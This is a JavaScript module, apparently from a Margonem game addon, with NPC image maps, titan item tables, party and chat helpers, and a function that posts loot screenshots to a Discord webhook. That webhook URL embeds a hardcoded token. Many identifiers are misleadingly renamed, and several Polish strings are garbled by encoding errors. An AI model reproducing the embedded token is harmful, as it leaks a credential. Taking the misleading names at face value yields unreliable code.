      "359": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/mechgoblin4.gif",
      "3341": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/bar_smokoszef.gif",
      "3037": "https://micc.garmory-cdn.cloud/obrazki/npc/kol/kolos-drakolisz.gif",
      "1204": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/wlochacze_wielka_stopa.gif",
      "6625": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/lisz_demilisze.gif",
      "6632": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/tollok_jask_atamatu.gif",
      "6623": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/nieu_mnich_grabarz.gif",
      "6537": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/kam_olbrzym-b.gif",
      "1325": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/lesne_widmo.gif",
      "1324": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/lesne_widmo.gif",
      "6774": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/krasnolud_boss.gif",
      "3765": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/cent-zyfryd.gif",
      "5851": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/r_orc_sheba.gif",
      "6615": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/magaz_zbrojmistrz.gif",
      "5862": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/prakrolowa.gif",
      "5684": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/quetzalcoatl-1a.gif",
      "5683": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/quetzalcoatl-1a.gif",
      "3038": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/szkiel_set.gif",
      "6054": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/chryzoprenia.gif",
      "6055": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/chryzoprenia.gif",
      "1322": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/tri_adariel.gif",
      "5708": "https://micc.garmory-cdn.cloud/obrazki/npc/tyt/tezcatlipoca.gif",
      "3596": "https://micc.garmory-cdn.cloud/obrazki/npc/kol/kolos-dendro.gif",
      "1480": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/maddok5.gif",
      "3340": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/bar_smoczyca.gif",
      "6781": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/gnom_figlid.gif",
      "7066": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/alghul-czaszka-1a.gif",
      "6956": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/grubber-ochlaj.gif",
      "6772": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/nadzorczyni_krasnoludow.gif",
      "1317": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/stworzyciel.gif",
      "7352": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/piaskowy_potwor-6a.gif",
      "7351": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/piaskowy_potwor-6a.gif",
      "7368": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/ingotia_minotaur-7a.gif",
      "1740": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/ingotia_minotaur-7a.gif",
      "7357": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/osmiornica-1b.gif",
      "7356": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/osmiornica-1b.gif",
      "7339": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/goral-e2-wojt-fistula.gif",
      "7340": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/goral-e2-wojt-fistula.gif",
      "351": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/goral-e2-tesciowa-rumcajsa.gif",
      "7689": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/cerasus-1a.gif",
      "333": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/gnoll11.gif",
      "7454": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/amuno.gif",
      "7453": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/amuno.gif",
      "7440": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/fodug_zolash.gif",
      "7441": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/fodug_zolash.gif",
      "7473": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/goons_asterus-1a.gif",
      "7474": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/goons_asterus-1a.gif",
      "125": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/razuglag.gif",
      "1150": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/goplana.gif",
      "3437": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/gnoll12.gif",
      "5395": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/zadlak-e2-owadzia-matka.gif",
      "7352": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/piaskowy_potwor-6a.gif",
      "4156": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/dzik.gif",
      "4185": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/zmutowana-roslinka.gif",
      "5293": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/tollok_shimger.gif",
      "8187": "https://micc.garmory-cdn.cloud/obrazki/npc/e2/trist2_wabicielka-1a.gif"
    },
    summon: {
      "Domina Ecclesiae": "https://micc.garmory-cdn.cloud/obrazki/npc/her/domina.gif",
      "Mietek Ĺťul": "https://micc.garmory-cdn.cloud/obrazki/npc/her/zulek.gif",
      "Mroczny Patryk": "https://micc.garmory-cdn.cloud/obrazki/npc/her/bardzozlypatryk.gif",
      "Karmazynowy Mściciel": "https://micc.garmory-cdn.cloud/obrazki/npc/her/gnom_msciciel.gif",
      Złodziej: "https://micc.garmory-cdn.cloud/obrazki/npc/her/zlodziej.gif",
      "Zły Przewodnik": "https://micc.garmory-cdn.cloud/obrazki/npc/her/mnich-zly2.gif",
      "Opętany Paladyn": "https://micc.garmory-cdn.cloud/obrazki/npc/her/opetanypaladyn02.gif",
      "Piekielny Kościej": "https://micc.garmory-cdn.cloud/obrazki/npc/her/piekielny_kosciej.gif",
      "Koziec Mąciciel Ścieżek": "https://micc.garmory-cdn.cloud/obrazki/npc/her/koziec_maciciel_sciezek.gif",
      "Kochanka Nocy": "https://micc.garmory-cdn.cloud/obrazki/npc/her/kochanka-nocy.gif",
      "Książę Kasim": "https://micc.garmory-cdn.cloud/obrazki/npc/her/ksiaze-kasim.gif",
      "Baca bez Łowiec": "https://micc.garmory-cdn.cloud/obrazki/npc/her/baca-bez-lowiec.gif",
      "Lichwiarz Grauhaz": "https://micc.garmory-cdn.cloud/obrazki/npc/her/heros_129xd.gif",
      "ObĹÄkany Ĺowca Orków": "https://micc.garmory-cdn.cloud/obrazki/npc/her/oblakany_ac1dae9d.gif",
      "Czarująca Atalia": "https://micc.garmory-cdn.cloud/obrazki/npc/her/tri_atalia.gif",
      "ĹwiÄty Braciszek": "https://micc.garmory-cdn.cloud/obrazki/npc/her/zalozyciel.gif",
      "Viviana Nandin": "https://micc.garmory-cdn.cloud/obrazki/npc/her/viv_nandin_i3bd1.gif",
      "Mulher Ma": "https://micc.garmory-cdn.cloud/obrazki/npc/her/mulher_ma.gif",
      "Demonis Pan Nicości": "https://micc.garmory-cdn.cloud/obrazki/npc/her/sekta_demon_cz_s.gif",
      Przeraza: "https://micc.garmory-cdn.cloud/obrazki/npc/her/przeraza.gif",
      "Vapor Veneno": "https://micc.garmory-cdn.cloud/obrazki/npc/her/joziniec_bagienny.gif",
      Dęborożec: "https://micc.garmory-cdn.cloud/obrazki/npc/her/zwierz_kniei.gif",
      Tepeyollotl: "https://micc.garmory-cdn.cloud/obrazki/npc/her/tep_35ecb966.gif",
      "Negthotep Czarny KapĹan": "https://micc.garmory-cdn.cloud/obrazki/npc/her/negthotep.gif",
      "Młody Smok": "https://micc.garmory-cdn.cloud/obrazki/npc/her/smokbarb.gif",
      "Złoty Roger": "https://micc.garmory-cdn.cloud/obrazki/npc/her/szkielet_pirata.gif",
      "Widmo Triady": "https://micc.garmory-cdn.cloud/obrazki/npc/her/trist2_widmo_triady.gif"
    }
  };
}
export const initTitanItems = () => {
  window.titanItems = {
    "Więzienie Demonów": {
      id: [5012528],
      prof: "bhw"
    },
    "Dwulicowość Bestii": {
      id: [6009966, 5730245],
      prof: "pt"
    },
    "Serce Thinkusa": {
      id: [],
      prof: "m"
    },
    "Oko aligatora": {
      id: [476420, 1961781, 5730245, 6110333, 7104178, 8395647, 8576127, 9441321, 8839561, 8719150],
      prof: "bht"
    },
    "Kaptur szronowych miraży": {
      id: [476420, 3358979, 5730245, 6110333, 6708261, 8051717, 8395647, 8612388, 1771359, 7104178, 8012514, 9173043, 5218810, 6408640, 9246937],
      prof: "mt"
    },
    "DĹonie ĹnieĹźnych lawin": {
      id: [476420, 6009966, 6586440, 7188620, 8012514],
      prof: "mp"
    },
    "Krok torfowego dywanu": {
      id: [1961781, 2885016, 5730245, 9463646, 2589816, 3358979],
      prof: "bh"
    },
    "Symbol demonicznego oddania": {
      id: [2170236, 2589816, 6117226, 8395647, 9173043, 6009966, 6110333, 6602169],
      prof: "bhtmpw"
    },
    "Zakrwawiona kurta Thinkusa": {
      id: [2170236, 6117226, 7088272, 8395647],
      prof: "pw"
    },
    "Kask mroĹşnego nieboskłonu": {
      id: [2170236, 2589816, 5012528, 5898306, 6971207, 8356281, 9179002, 3358979, 6117226, 2482304, 7088272],
      prof: "bh"
    },
    "Krwawe echo wojny": {
      id: [2482304, 5730245, 6045847, 6110333, 6386813, 8719150, 9179002, 6602169, 476420, 6227794, 3432632, 8395647, 3358979, 7104178, 5012528, 2170236],
      prof: "bht"
    },
    "Uwięziona świadomość półolbrzymki": {
      id: [2482304, 2589816, 4947586, 5730245, 6586440, 8719150, 9160538, 6701419, 3432632],
      prof: "bhtmpw"
    },
    "Magmowa pieczęć kreatora": {
      id: [476420, 2589816, 3588074, 6701419, 7561171, 8612388, 4987620, 606767, 7972634, 7088272, 2482304, 5218810, 6708261, 9246937, 4658550, 9924312, 8356281, 923957, 3432632],
      prof: "mpt"
    },
    "Kopuła nadawcza": {
      id: [2589816, 5730245, 6110333, 6586440, 6602169, 6971207, 7088272, 8051717, 8612388, 8839561],
      prof: "mpt"
    },
    "Raad Ar": {
      id: [2589816, 3303246, 8051717, 8719150, 7104178],
      prof: "bhw"
    },
    "Zębate mankiety przekładni": {
      id: [2589816, 6009966, 6110333, 6701419, 7088272, 7720384, 8051717, 8576127, 8719150],
      prof: "bhtmpw"
    },
    "Zaginiony pierścień jadu": {
      id: [2589816, 4947586, 5012528, 6110333, 6586440, 6602169, 6701419, 8051717, 8719150, 3977940],
      prof: "bhtmpw"
    },
    "Czarna maska bachanalii": {
      id: [2589816, 3588074, 6009966, 6216645, 6701419, 6708261, 8051717, 8630499, 9173043],
      prof: "m"
    },
    "SkĂłra zdjÄta z demona": {
      id: [2589816, 3588074, 6110333, 6708261, 5730245],
      prof: "mt"
    },
    "KĹÄcza i wodorosty": {
      id: [2589816, 6110333, 6586440, 7088272, 3947507, 6009966],
      prof: "mp"
    },
    "Łapy boskiego jaguara": {
      id: [2589816, 5730245, 5898306, 6110333, 6386813, 6701419, 6971207, 2170236, 9173043, 2482304],
      prof: "bht"
    },
    "Kościany sygnet szamana": {
      id: [2589816, 5012528, 5898306, 6386813, 6701419, 6971207, 9179002, 2170236, 6206391, 7972634],
      prof: "bh"
    },
    "Parszywe obuwie świętokradcy": {
      id: [2589816, 4888901, 5730245, 9179002, 9173043, 6971207, 7972634, 8356281, 6122480, 5012528],
      prof: "bht"
    },
    "Perła Pustyni": {
      id: [2589816, 5730245, 6110333, 6386813, 8356281, 1771359, 6701419, 6408640, 6586440, 5204655, 9924312],
      prof: "bhtmpw"
    },
    "Ognista pieczęć Barbatosa": {
      id: [2589816, 5012528, 5730245, 5898306, 6708261, 7088272, 8356281, 9179002, 3358979, 2170236, 2482304, 9173043, 6408640, 8395647],
      prof: "bht"
    },
    "Chwyt gĹÄbokiej martwicy": {
      id: [2589816, 3358979, 6701419, 8395647, 8414534, 6586440, 8612388, 6602169, 2482304, 8051717, 5012528, 3432632],
      prof: "bw"
    },
    "Dotyk nagłej krystalizacji": {
      id: [2589816, 5730245, 6110333, 6708261, 8356281, 9339291, 1771359, 9204116, 2170236],
      prof: "ht"
    },
    "KoĹskie kokosy": {
      id: [2885016, 6602169, 8012514, 9441321, 8252819, 8395647, 9160538, 6586440],
      prof: "pw"
    },
    "Czerep powietrznej dominacji": {
      id: [3303246, 6708261, 6701419, 8408736, 8356281],
      prof: "bht"
    },
    "Sygnet króliczej przemiany": {
      id: [3303246, 9179002, 8719150, 8356281, 8408736, 6586440],
      prof: "bht"
    },
    "Krok gniewnych erupcji": {
      id: [3303246, 6701419, 7316243, 7561171, 4658550, 8012514, 8051717],
      prof: "bhtmpw"
    },
    "Kolczatka więźnia wulkanu": {
      id: [3303246, 8719150, 3358979, 9160538, 1694265, 6122480, 6206391, 9173043, 2589816],
      prof: "bh"
    },
    "Atrybut pani wspomnieĹ": {
      id: [3303246, 4947586, 7088272, 9160538, 8408736],
      prof: "pw"
    },
    "Obuwie jednoĹci z naturą": {
      id: [3303246, 6586440, 9339291, 8612388],
      prof: "wp"
    },
    "Amulet bagiennych rybaków": {
      id: [3303246, 8612388, 9339291],
      prof: "w"
    },
    "Skurczona czaszka olbrzyma": {
      id: [3358979, 2589816],
      prof: "h"
    },
    "Niezniszczalne łańcuchy": {
      id: [3358979, 8356281, 2589816, 3432632, 1961781, 9736753, 9204116, 9179002],
      prof: "hm"
    },
    "Czarna stal Tanrotha": {
      id: [3358979, 6009966, 6045847, 6586440, 6701419, 7561171, 4512181],
      prof: "pw"
    },
    "Szpony pożeracza serc": {
      id: [3588074, 6045847, 8051717, 7104178, 3432632],
      prof: "m"
    },
    "Palce przeszĹoĹci": {
      id: [4763316, 5730245, 6386813, 6701419, 8012514, 8576127, 476420, 6586440, 9463646],
      prof: "mt"
    },
    "Minutowy zapalnik bombowy": {
      id: [4947586, 5730245, 6110333, 6216645, 8012514, 7104178, 6602169, 9339291, 6081495],
      prof: "bhtmpw"
    },
    "Ciężkie zawieszenie maszyny": {
      id: [6009966, 7088272, 8012514, 6422618],
      prof: "pw"
    },
    "HeĹm antyiperytowy": {
      id: [6110333],
      prof: "ht"
    },
    "Maska z systemem chłodzenia": {
      id: [6586440, 9035101, 9736753, 9246937, 3432632],
      prof: "mp"
    },
    "Mobilne agregatory prądotwórcze": {
      id: [],
      prof: "mt"
    },
    "Proteza gładkolufowa": {
      id: [2589816, 9173043],
      prof: "bh"
    },
    "Spalinowy kask goblina": {
      id: [6422618],
      prof: "bw"
    },
    "Demoniczne tabernakulum": {
      id: [4947586, 5730245, 6586440, 6971207, 8356281, 6701419, 7278956, 6602169, 7972634, 3358979, 9810662, 6408640, 2589816, 5218810, 5218810],
      prof: "bht"
    },
    "Boska korona Tezcatlipoki": {
      id: [4947586, 5898306, 6009966, 6971207, 8395647],
      prof: "bhtmpw"
    },
    "Lodowe oko bogów": {
      id: [4947586, 6045847, 6110333, 6227794, 7188620, 8012514, 8051717, 3432632],
      prof: "mt"
    },
    "Zawiniątko z ery bogĂłw": {
      id: [5012528, 8719150, 9179002, 5730245, 4987620, 6971207, 9173043],
      prof: "bt"
    },
    "Blaszki Nicości": {
      id: [5012528, 6602169, 7972634, 3358979, 6701419],
      prof: "bh"
    },
    "Błyskotka z Ventum Avem": {
      id: [5218810, 6386813, 8051717],
      prof: "mt"
    },
    "Para morderczych uszu": {
      id: [5218810, 8356281, 6586440, 6701419, 941282],
      prof: "ht"
    },
    "Wyrok boskiego sądu": {
      id: [5730245, 7088272, 8630499, 9441321, 6602169, 9173043, 3432632, 5204655, 6586440],
      prof: "mpt"
    },
    "Klatka niezwykĹej rozkoszy": {
      id: [5898306, 6009966, 6117226, 6701419],
      prof: "pw"
    },
    "Bambosze z Zabójczego Królika": {
      id: [6009966, 6045847, 6216645, 6602169, 6701419, 6708261, 8012514, 8252819, 8356281, 8395647, 6586440],
      prof: "bhtmpw"
    },
    "Szmaragdowe serce demona": {
      id: [6009966, 6045847, 6216645, 6586440, 6602169, 6701419, 7561171, 7088272, 8395647, 3358979, 923957, 3492730, 2589816],
      prof: "pw"
    },
    "Stalowe podeszwy Hebrehotha": {
      id: [6009966, 6386813, 6586440, 6701419, 6602169, 7088272, 8395647],
      prof: "pw"
    },
    "Kolia smoczego kapłana": {
      id: [6009966, 6045847, 6586440, 6708261, 7561171, 8051717, 8012514, 5204655, 3432632],
      prof: "mp"
    },
    "Przemoc właściwa systemowi": {
      id: [6045847, 6701419, 8356281, 8719150, 7188620, 8408736, 8107806],
      prof: "bm"
    },
    "Kajdany zapomnienia": {
      id: [6045847, 7104178, 9179002, 8719150, 3432632],
      prof: "bh"
    },
    "Trzcinowe pantofle maddoka": {
      id: [6110333, 3432632, 6122480, 5730245, 9179002],
      prof: "mt"
    },
    "Metalowa powieka Anariel": {
      id: [6216645, 7088272, 8051717, 8576127, 8408736, 6586440, 6009966],
      prof: "pw"
    },
    "Pazury Tzayanatl": {
      id: [6216645, 6586440, 6602169, 6701419, 7088272, 7561171],
      prof: "pw"
    },
    "Klejnot północnego sztormu": {
      id: [6386813, 8051717, 9179002, 6701419, 8356281],
      prof: "bhtmpw"
    },
    "Pamięć śnieĹźnych wĹadców": {
      id: [6586440, 6701419, 8012514, 8051717, 8576127, 7880679, 7228793, 3432632],
      prof: "mp"
    },
    "Artefakt minionej ery": {
      id: [6586440, 1771359, 2589816, 8051717, 5218810, 2170236],
      prof: "bhtmpw"
    },
    "PrzesĹona złotych skrzydeł": {
      id: [6602169, 6701419, 6586440, 1961781],
      prof: "pw"
    },
    "Obuwie wĹadcy olbrzymów": {
      id: [6602169, 6701419, 6708261, 8012514, 8356281, 9179002, 9463646, 9736753, 2170236, 7104178, 3358979],
      prof: "bhtmpw"
    },
    "Kaptur ognia piekielnego": {
      id: [6701419, 4658550, 9246937, 8252819, 9924312, 8814642, 3432632],
      prof: "m"
    },
    "Oczeretowe pazury maddoka": {
      id: [6701419, 7561171, 7880679, 8012514, 8612388, 9339291, 9463646],
      prof: "bhtmpw"
    },
    "Puszysty ogonek": {
      id: [7088272, 7188620, 8630499, 9441321, 5848745, 3432632, 9810662],
      prof: "mp"
    },
    "Kask władcy feniksów": {
      id: [7720384, 8612388, 6602169, 7088272, 923957, 2482304, 9441321],
      prof: "pw"
    },
    "Para zabójczych zÄbĂłw": {
      id: [8012514, 8252819],
      prof: "w"
    },
    "Symbol zakazanej miĹości": {
      id: [8051717, 8012514, 5012528],
      prof: "bw"
    },
    "Piaskowe szpony smoka": {
      id: [8051717, 9246937, 1961781, 3432632],
      prof: "m"
    },
    "Bursztynowy sygnet harpii": {
      id: [8356281, 8408736],
      prof: "bh"
    },
    "Czerep toczącej się lawy": {
      id: [8719150, 3358979, 8051717, 8356281, 5730245],
      prof: "bht"
    },
    "Wspomnienie staroĹźytnych": {
      id: [8408736, 6602169, 2170236, 8612388],
      prof: "w"
    },
    "Korona z ptasiego pierza": {
      id: [],
      prof: "m"
    },
    "Złote PisklÄ": {
      id: [2482304, 6586440, 1961781, 6602169, 4176854],
      prof: "pw"
    },
    "Pięć kryształów mocy": {
      id: [4176854],
      prof: "w"
    },
    "Medalion gadziej mutacji": {
      id: [6701419, 6602169, 8395647],
      prof: "w"
    }
  };

  window.hasProf = (clanChannelPrefix, clanChannelMessage) => {
    return window.titanItems[clanChannelPrefix]?.prof.includes(clanChannelMessage);
  };

  window.hasItem = (teamChannelPrefix, teamChannelMessage) => {
    return window.titanItems[teamChannelPrefix]?.id.includes(Number(teamChannelMessage));
  };
};
export function getParty() {
  let globalMessagePayload = {
    has: false,
    leader: {
      id: null,
      nick: null
    },
    members: 1
  };
  const localMessagePayload = Engine?.party?.getMembers?.();

  if (!localMessagePayload) {
    return globalMessagePayload;
  }

  if (localMessagePayload) {
    globalMessagePayload.has = true;
    globalMessagePayload.members = localMessagePayload.size;
  }

  for (const [currentMapConfigData, isMapPvpRestricted] of localMessagePayload.entries()) {
    if (isMapPvpRestricted?.leader) {
      globalMessagePayload.leader.id = currentMapConfigData;
      globalMessagePayload.leader.nick = isMapPvpRestricted.nick;
    }
  }

  return globalMessagePayload;
}
export function getKillSecondsText(mapStatusOverlayText) {
  const chatChannelTarget = Engine.npcs.getById(mapStatusOverlayText);
  let isChatWhisper = "";

  if (chatChannelTarget?.d?.killSeconds > 0) {
    let formattedWhisperMessage = ts() + Number(chatChannelTarget.d.killSeconds) * 1000;
    isChatWhisper = ", pozostało: " + formatSekundy(chatChannelTarget.d.killSeconds) + " min. (o " + getJoinTime(formattedWhisperMessage) + ")";
  }

  return isChatWhisper;
}
export async function createAndSendMessageToChat(chatChannelIndex, whisperTargetName, whisperPayloadMessage = "") {
  const whisperNetworkCallback = whisperTargetName?.lvl ? whisperTargetName.lvl : whisperTargetName.elasticLevel;
  const generalChatPayload = whisperTargetName.nick + " (" + (whisperNetworkCallback ? whisperNetworkCallback : "") + (whisperTargetName.prof === "npc" ? "" : whisperTargetName.prof) + ") - " + whisperTargetName.map.name + " (" + whisperTargetName.map.x + ", " + whisperTargetName.map.y + ")" + whisperPayloadMessage;
  const generalChatCallback = {
    c: generalChatPayload
  };

  window._g("chat&channel=" + chatChannelIndex, false, generalChatCallback);
}
export const getItemsAllInGame = () => {
  const allDiscoveredItemsArray = [];
  const engineTestItemsRegistry = Engine.items.test().items;

  for (const testItemsIteratorKey in engineTestItemsRegistry) {
    allDiscoveredItemsArray.push(engineTestItemsRegistry[testItemsIteratorKey]);
  }

  const engineShopItemsRegistry = Engine.shop?.items;

  if (!engineShopItemsRegistry) {
    return allDiscoveredItemsArray;
  }

  for (const shopItemsIteratorKey in engineShopItemsRegistry) {
    allDiscoveredItemsArray.push(engineShopItemsRegistry[shopItemsIteratorKey]);
  }

  return allDiscoveredItemsArray;
};
export function canSell(itemClsString) {
  itemClsString = itemClsString.toString();
  const {
    shop: engineShopInstance
  } = Engine;

  if (!engineShopInstance || !engineShopInstance.purchase) {
    return false;
  }

  const {
    purchase: shopPurchaseConfig
  } = engineShopInstance;

  if (shopPurchaseConfig == "*") {
    return true;
  }

  const allowedShopClassesArray = shopPurchaseConfig.split(",");
  const isItemClassSellable = allowedShopClassesArray.indexOf(itemClsString) != -1;
  console.log(allowedShopClassesArray, itemClsString, isItemClassSellable);
  return isItemClassSellable;
}
export function isPvPMap() {
  const {
    mode: engineMapMode,
    pvp: engineMapPvpMode
  } = Engine.map.d;
  return engineMapPvpMode === 2 && (engineMapMode === 1 || engineMapMode === 2) || engineMapMode === 4;
}
export async function sendImage(discordImagePayload, lootAnnouncementTitle, capturedMobName, mapLocationName, partyCountValue) {
  const colorWhiteConst = "white";
  const colorOrangeConst = "orange";
  const colorHexPinkConst = "#F450FF";
  const discordWebhookUrlEndpoint = "https://discord.com/api/webhooks/1380928935394545860/J7W54kB7KNyHMv9pxH1sTZA_tD-Rmj1jtV0oqTTAA9jHlQ7VeUt5ZlY0VPPgLsvVMoya";
  const hiddenCanvasElement = document.createElement("canvas");
  hiddenCanvasElement.width = 1000;
  hiddenCanvasElement.height = 400;
  hiddenCanvasElement.style.display = "none";
  document.body.appendChild(hiddenCanvasElement);
  const canvasContext2d = hiddenCanvasElement.getContext("2d");
  canvasContext2d.fillStyle = "#1e1e2f";
  canvasContext2d.fillRect(0, 0, hiddenCanvasElement.width, hiddenCanvasElement.height);
  canvasContext2d.font = "bold 40px Lexend";
  canvasContext2d.textAlign = "center";
  canvasContext2d.textBaseline = "top";
  canvasContext2d.lineWidth = 4;
  canvasContext2d.strokeStyle = "black";
  canvasContext2d.strokeText(lootAnnouncementTitle.toUpperCase(), hiddenCanvasElement.width / 2, 44);
  canvasContext2d.fillStyle = colorWhiteConst;
  canvasContext2d.fillText(lootAnnouncementTitle.toUpperCase(), hiddenCanvasElement.width / 2, 44);

  function drawTextShadowedHelper(shadowTextStr, shadowTextX, shadowTextY, shadowTextColor) {
    canvasContext2d.strokeText(shadowTextStr, shadowTextX, shadowTextY);
    canvasContext2d.fillStyle = shadowTextColor;
    canvasContext2d.fillText(shadowTextStr, shadowTextX, shadowTextY);
  }

  canvasContext2d.font = "bold 30px Lexend";
  canvasContext2d.textBaseline = "bottom";
  canvasContext2d.lineWidth = 3;
  canvasContext2d.strokeStyle = "black";
  canvasContext2d.textAlign = "left";
  const prefixCaughtStr = "Złapał ";
  const infixInStr = " w ";
  const suffixPlayersGroupStr = " osobowej grupie!";
  const lootAlertMainMessage = prefixCaughtStr + discordImagePayload + infixInStr + capturedMobName + suffixPlayersGroupStr;
  const prefixGroupCompositionStr = canvasContext2d.measureText(lootAlertMainMessage).width;
  let groupMembersListStr = hiddenCanvasElement.width / 2 - prefixGroupCompositionStr / 2;
  let canvasDataUrlString = hiddenCanvasElement.height - 60;
  drawTextShadowedHelper(prefixCaughtStr, groupMembersListStr, canvasDataUrlString, colorWhiteConst);
  groupMembersListStr += canvasContext2d.measureText(prefixCaughtStr).width;
  drawTextShadowedHelper(discordImagePayload, groupMembersListStr, canvasDataUrlString, colorOrangeConst);
  groupMembersListStr += canvasContext2d.measureText(discordImagePayload).width;
  drawTextShadowedHelper(infixInStr, groupMembersListStr, canvasDataUrlString, colorWhiteConst);
  groupMembersListStr += canvasContext2d.measureText(infixInStr).width;
  drawTextShadowedHelper(capturedMobName, groupMembersListStr, canvasDataUrlString, colorOrangeConst);
  groupMembersListStr += canvasContext2d.measureText(capturedMobName).width;
  drawTextShadowedHelper(suffixPlayersGroupStr, groupMembersListStr, canvasDataUrlString, colorWhiteConst);
  const canvasBlobData = "Zdobyte z: ";
  canvasContext2d.font = "bold 24px Lexend";
  canvasContext2d.textBaseline = "bottom";
  canvasContext2d.lineWidth = 3;
  canvasContext2d.strokeStyle = "black";
  canvasContext2d.textAlign = "left";
  const formDataPayload = canvasBlobData;
  const discordEmbedsArray = mapLocationName;
  const discordPayloadJson = canvasContext2d.measureText(formDataPayload).width;
  const webhookXhrRequest = canvasContext2d.measureText(discordEmbedsArray).width;
  const lootItemsRawString = discordPayloadJson + webhookXhrRequest;
  const itemBlocksArray = hiddenCanvasElement.width / 2 - lootItemsRawString / 2;
  const lootedItemsDataCollection = hiddenCanvasElement.height - 20;
  drawTextShadowedHelper(formDataPayload, itemBlocksArray, lootedItemsDataCollection, colorWhiteConst);
  drawTextShadowedHelper(discordEmbedsArray, itemBlocksArray + discordPayloadJson, lootedItemsDataCollection, colorOrangeConst);
  const individualItemBlock = new Date();
  const individualItemAttributes = String(individualItemBlock.getDate()).padStart(2, "0") + "." + String(individualItemBlock.getMonth() + 1).padStart(2, "0") + "." + individualItemBlock.getFullYear() + " " + String(individualItemBlock.getHours()).padStart(2, "0") + ":" + String(individualItemBlock.getMinutes()).padStart(2, "0");
  canvasContext2d.font = "14px Lexend";
  canvasContext2d.textBaseline = "bottom";
  canvasContext2d.lineWidth = 2;
  canvasContext2d.strokeStyle = "black";
  canvasContext2d.textAlign = "left";
  const lootedItemId = 10;
  const lootedItemName = hiddenCanvasElement.height - 10;
  drawTextShadowedHelper(individualItemAttributes, lootedItemId, lootedItemName, colorWhiteConst);
  const lootedItemCount = 128;
  const lootedItemRarity = hiddenCanvasElement.width / 2 - lootedItemCount / 2;
  const lootedItemColorHex = hiddenCanvasElement.height / 2 - lootedItemCount / 2;
  canvasContext2d.shadowBlur = 25;
  canvasContext2d.shadowOffsetX = 0;
  canvasContext2d.shadowOffsetY = 0;
  canvasContext2d.stroke();
  canvasContext2d.shadowColor = colorHexPinkConst;
  const lootedItemIconUrl = new Image();
  lootedItemIconUrl.crossOrigin = "anonymous";
  lootedItemIconUrl.src = "https://micc.garmory-cdn.cloud/obrazki/itemy/" + partyCountValue;
  await new Promise(lootedItemStatsStr => {
    lootedItemIconUrl.onload = () => {
      canvasContext2d.drawImage(lootedItemIconUrl, lootedItemRarity, lootedItemColorHex, lootedItemCount, lootedItemCount);
      lootedItemStatsStr();
    };

    lootedItemIconUrl.onerror = () => {
      lootedItemStatsStr();
    };
  });
  const parsedItemStatsConfig = hiddenCanvasElement.toDataURL("image/png");
  const isItemLegendaryBonus = await (await fetch(parsedItemStatsConfig)).blob();
  const itemRarityEnum = new FormData();
  itemRarityEnum.append("file", isItemLegendaryBonus, "obrazek.png");

  try {
    await fetch(discordWebhookUrlEndpoint, {
      method: "POST",
      body: itemRarityEnum
    });
  } catch (itemRarityStyleClasses) {
    console.error("Błąd podczas wysyłania obrazka:", itemRarityStyleClasses);
  } finally {
    document.body.removeChild(hiddenCanvasElement);
  }
}
export function getCore() {
  const rarityColorHexCode = {
    a: true,
    p: "https://",
    h: "margoplus.pl",
    v: "1.0.1",
    c: [57, 85, 124, 118],
    r: {}
  };
  rarityColorHexCode.r.Tanroth = "1204147563431727195";
  rarityColorHexCode.r["Barbatos Smoczy StraĹźnik"] = "1204147544536387686";
  rarityColorHexCode.r["ZabĂłjczy KrĂłlik"] = "1204147248586424411";
  rarityColorHexCode.r["Renegat Baulus"] = "1204147273362047016";
  return rarityColorHexCode;
}
export const copyText = hasLegendaryValue => {
  let customDiscordDescription = document.createElement("textarea");
  customDiscordDescription.value = hasLegendaryValue;
  customDiscordDescription.style.position = "fixed";
  customDiscordDescription.style.top = 0;
  customDiscordDescription.style.left = 0;
  customDiscordDescription.style.opacity = 0;
  document.body.appendChild(customDiscordDescription);
  customDiscordDescription.select();
  document.execCommand("copy");
  document.body.removeChild(customDiscordDescription);
};
export function waitForCondition(fieldLootedItemName, discordEmbedFieldsArray = 1000000, finalDiscordPayloadJson = 250) {
  const isLootNotificationActive = Date.now();
